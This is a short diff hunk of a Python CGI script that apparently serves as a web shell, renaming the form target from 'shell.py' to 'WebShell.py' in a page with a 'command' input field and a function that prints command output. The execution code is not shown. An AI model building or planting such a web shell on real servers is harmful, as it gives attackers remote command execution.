@@ -38,7 +38,7 @@ def print_command_output(command, output):
 
 def main():
     print_html_header()
-    print("<form method='post' action='shell.py'>")
+    print("<form method='post' action='WebShell.py'>")
     print("<input type='text' name='command' />")
     print("<input type='submit' value='Submit' />")
     print("</form>")
